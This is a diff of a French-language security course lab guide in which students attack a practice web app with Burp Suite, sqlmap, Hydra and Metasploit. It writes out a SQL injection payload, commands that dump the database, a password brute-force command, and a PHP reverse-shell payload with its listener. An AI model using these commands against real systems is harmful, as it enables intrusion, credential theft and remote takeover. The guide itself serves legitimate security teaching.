@@ -299,15 +299,15 @@ Intercepter du trafic révélant la présence d'une vulnérabilité (injection S
 
 ### Étapes
 
-1. Assurez-vous que Burp Suite est toujours activé comme proxy pour votre navigateur web
-1. Dans la fonctionnalité de recherche (en haut à droite), utilisez la valeur `')`
+1. Assurez-vous que Burp Suite est toujours activé comme proxy pour votre navigateur web et qu'il intercepte le trafic
+1. Dans la fonctionnalité de recherche (en haut à droite), entrez n'importe quelle valeur (ex.: `apple`)
+1. Dans la requête interceptée, remplacez votre valeur (ex.:`apple`) par `')`
 1. Observez la réponse fournie par le serveur dans Burp Suite
-1. Sauvegardez la requête dans un fichier nommé `request.txt`
 1. Tentez d'exploiter la vulnérabilité pour exfiltrer tous les produits de la base de données
-1. Sachant que, pour une base de données `sqlite`, le schéma `sqlite_master` existe et contient les métadonnées de la base de données
+1. Sachant que, pour une base de données `sqlite`, le schéma `sqlite_master` existe toujours et contient les métadonnées de la base de données
   - Essayez d'exploiter la vulnérabilité avec l'entrée suivante: 
     ```
-    mavaleur'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20
+     mavaleur')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master--
     ```
   - Que fait la requête ci-haut ? 
   - Pourquoi l'information ainsi exfiltrée peut être utile pour un *hacker* ?
@@ -335,23 +335,28 @@ Observer comment une injection SQL peut être exploitée automatiquement.
 
 ### Étapes
 
-1. Analysez la requête SQL vulnérable capturée précédemment à l'aide de l'outil `sqlmap`  
+1. Utilisez d'abord l'outil `sqlmap` pour confirmer que le *endpoint* semble bel et bien vulnérable à l'injection SQL  
 
     ```bash
-    sqlmap -r request.txt --dbs
+    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple"
     ```
+{: .astuce}
+> Si `sqlmap` ne détecte rien, essayez de faire varier le paramètre `--level=<1...5>`
 
 2. Utilisez `sqlmap` pour analyser le schéma de la base de données complet
 
     ```bash
-    sqlmap -r request.txt --tables
-    sqlmap -r request.txt --dump
+    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple" --tables
+    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple" --dump
     ```
+
+{: .astuce}
+> Vous pouvez accélérer cette opération en augmentant le nombre de threads utilisés à l'aide du parametre `--threads=<nb de threads>`
 
 ### Questions de réflexion
 
 - SQLMap détecte-t-il automatiquement la vulnérabilité ?  
-- Quelles actions aurait-il fallu réaliser manuellement ?  
+- Quelles actions aurait-il fallu réaliser manuellement pour arriver aux mêmes conclusions ?
 - Pourquoi cet outil est-il particulièrement dangereux ?  
 
 ---
@@ -373,21 +378,22 @@ Comprendre comment un attaquant teste automatiquement des mots de passe.
 
 1. À l'aide de Burp Suite, interceptez une requête de login et identifiez :
 
-      - l’URL exacte (ex.: `/rest/user/login`)  
-      - les paramètres envoyés (`email`, `password`)  
+      - l’URL exacte (ex.: `/login`)  
+      - les paramètres envoyés (`username`, `password`)
+        - ***Important**: Il faut aussi tenir compte du format*
       - le message d’erreur retourné en cas d’échec  
 
       Exemple de message :
 
       ```text
-      Invalid email or password
+      Unable to authenticate
       ```
 
 
-2. Construisez la commande Hydra
+2. Construisez la commande Hydra, par exemple (en assumant la structure précédente, elle peut varier dans votre cas précis) : 
 
     ```bash
-    hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
+    hydra -l admin@juice-sh.op -s <PORT> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}1=401:H=Content-Type\:application/json:F=Unable"
     ```
 
 
@@ -402,8 +408,84 @@ Comprendre comment un attaquant teste automatiquement des mots de passe.
 - Pourquoi Hydra a besoin du message d’erreur ?  
 - Quelles mesures pourraient empêcher cette attaque ?  
 
+---
+
+## 7. Exploitation avec Metasploit
+
+Certains cadriciels (*frameworks*) fournissent des modules déjà prêts à l'utilisation pour des vulnérabilités connues. Ces *frameworks* accélèrent grandement le travail des *hackers*.
+
+### Outils
+
+- Metasploit
+- msfvenom
+
+### Objectif
+
+Comprendre le principe d’un *shell* inversé (*reverse shell*) et son utilisation avec Metasploit.
+
+### Étapes
+
+1. Lancez Metasploit
+
+  ```bash
+  msfconsole
+  ```
 
 
+1. Générez une charge utile (*payload*)
+
+  ```bash
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
+  ```
 
 
+1. Préparez un *listener*
+
+```bash
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST <IP>
+set LPORT 4444
+run
+```
+
+1. Cherchez une fonctionnalité dans l’application permettant :
+
+  - d’envoyer un fichier  
+  - de téléverser du contenu  
+
+
+### Questions de réflexion
+
+- Que fait un reverse shell ?  
+- Quelle faille est exploitée ?  
+
+---
+
+## 8. Questions de réflexion finale
+
+1. L'approche de Spectre est-elle éthique à votre avis ? Pourquoi ?
+1. Selon votre réponse à la question précédente, à quel catégorie de *hackers* appartient Spectre ? Pourquoi ?
+1. Quelles seraient les conditions pour que Spectre bascule dans une catégorie différente ?
+
+---
+
+## 9. BONUS : Exploration libre
+
+À ce stade, aucun guide précis n’est fourni.
+
+### Objectif
+
+Développer votre propre approche.
+
+### Travail
+
+- Combinez les outils  
+- Testez différentes idées  
+- Observez les réactions du système  
+
+### Questions de réflexion
+
+- Qu’avez-vous découvert sans consigne spécifique ?  
+- Quelle stratégie a été la plus efficace ?  
 
